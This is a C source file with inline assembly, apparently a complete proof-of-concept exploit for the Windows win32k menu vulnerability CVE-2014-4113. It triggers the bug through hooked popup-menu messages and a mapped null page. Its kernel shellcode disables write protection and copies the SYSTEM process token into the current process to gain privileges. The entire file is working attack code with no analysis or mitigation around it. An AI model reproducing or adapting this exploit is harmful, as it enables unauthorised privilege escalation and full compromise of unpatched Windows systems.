#include "CVE-2014-4113.h"

WNDPROC lpPrevWndFunc = NULL;

BOOL Exploit_CVE_2014_4113()
{
	BOOL bRet = TRUE;

	if (!Init())
	{
		printf("Init fail...\n");
		bRet = FALSE;
		goto exit;
	}

	if (!Exploit())
	{
		printf("Exploit fail...\n");
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Exploit()
{
	BOOL bRet = TRUE;
	HWND hWnd = NULL;
	WNDCLASS wc = { 0 };
	HMENU hMenu1 = NULL, hMenu2 = NULL;
	MENUITEMINFO Item1 = { 0 }, Item2 = { 0 };

	memset(&wc, 0, sizeof(wc));

	wc.hInstance = GetModuleHandle(NULL);
	wc.lpfnWndProc = WndProc;
	wc.lpszClassName = "1900";

	if (!RegisterClassA(&wc))
	{
		ShowError("RegisterClassA", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	hWnd = CreateWindowA(wc.lpszClassName,
						 "",
						 WS_OVERLAPPEDWINDOW | WS_VISIBLE,
						 0,
						 0,
						 640,
						 480,
						 NULL,
						 NULL,
						 wc.hInstance,
						 NULL);
	if (!hWnd)
	{
		ShowError("CreateWindowEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	hMenu1 = CreatePopupMenu();
	if (!hMenu1)
	{
		ShowError("CreatePopupMenu", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	memset(&Item1, 0, sizeof(Item1));
	memset(&Item2, 0, sizeof(Item2));

	Item1.cbSize = sizeof(Item1);
	Item1.fMask = MIIM_STRING;
	if (!InsertMenuItemA(hMenu1, 0, TRUE, &Item1))
	{
		ShowError("InsertMenuItemA 1", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	hMenu2 = CreatePopupMenu();
	if (!hMenu2)
	{
		ShowError("CreatePopupMenu 2", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	Item2.fMask = MIIM_STRING | MIIM_SUBMENU;
	Item2.dwTypeData = "";
	Item2.cch = 1;
	Item2.hSubMenu = hMenu1;
	Item2.cbSize = sizeof(Item2);

	if (!InsertMenuItemA(hMenu2, 0, TRUE, &Item2))
	{
		ShowError("InsertMenuItemA 2", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	HHOOK winHook = SetWindowsHookExA(WH_CALLWNDPROC,
									  WndProcHook,
									  NULL,
									  GetCurrentThreadId());
	if (winHook == NULL)
	{
		ShowError("SetWindowsHookExA", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 触发漏洞
	if (!TrackPopupMenu(hMenu2, 0, 0, 0, 0, hWnd, NULL))
	{
		ShowError("TrackPopupMenu", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	
exit:
	if (hMenu2)
	{
		DestroyMenu(hMenu2);
		hMenu2 = NULL;
	}

	if (hMenu1)
	{
		DestroyMenu(hMenu1);
		hMenu1 = NULL;
	}

	if (hWnd)
	{
		DestroyWindow(hWnd);
		hWnd = NULL;
	}

	return bRet;
}

LRESULT CALLBACK WndProcHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	CWPSTRUCT *pWndProcArgs = (CWPSTRUCT *)lParam;

	if (pWndProcArgs->message == 0x1EB)
	{
		if (UnhookWindowsHook(WH_CALLWNDPROC, WndProcHook))
		{
			lpPrevWndFunc = (WNDPROC)SetWindowLongA(pWndProcArgs->hwnd,
													GWL_WNDPROC,
													(LONG)MenuWndProc);
			if (lpPrevWndFunc == 0)
			{
				ShowError("SetWindowLongA", GetLastError());
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK MenuWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg == 0x1EB)
	{
		EndMenu();
		return -5;
	}

	return CallWindowProcA(lpPrevWndFunc, hWnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	// 如果窗口处于空间状态
	if (uMsg == WM_ENTERIDLE)
	{
		PostMessageA(hWnd, WM_KEYDOWN, VK_DOWN, 0);
		PostMessageA(hWnd, WM_KEYDOWN, VK_RIGHT, 0);
		PostMessageA(hWnd, WM_LBUTTONDOWN, 0, 0);
	}

	return DefWindowProcA(hWnd, uMsg, wParam, lParam);
}

BOOL Init()
{
	BOOL bRet = TRUE;

	if (AllocateZeroMemory())
	{
		*(DWORD*)(0x3) = GetPtiCurrent();
		*(BYTE*)(0x11) = (BYTE)4;
		*(DWORD*)(0x5B) = (DWORD)ShellCode;
	}
	else bRet = FALSE;

	return bRet;
}

DWORD GetPtiCurrent()
{
	__asm
	{
		mov eax, fs:[0x18]
		mov eax, [eax + 0x40]
	}
}

LRESULT CALLBACK ShellCode(DWORD p1, DWORD p2, DWORD p3, DWORD p4)
{
	// 关闭页保护
	__asm
	{
		cli
		mov eax, cr0
		and eax, ~0x10000
		mov cr0, eax
	}

	__asm
	{
		// 取当前线程
		mov eax, fs:[0x124]
		// 取线程对应的EPROCESS
		mov esi, [eax + 0x150]
		mov eax, esi
	searchWin7 :
		mov eax, [eax + 0xB8]
		sub eax, 0xB8
		mov edx, [eax + 0xB4]
		cmp edx, 0x4
		jne searchWin7
		mov eax, [eax + 0xF8]
		mov [esi + 0xF8], eax
	}

	// 开起页保护
	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
		sti
	}

	return 0;
}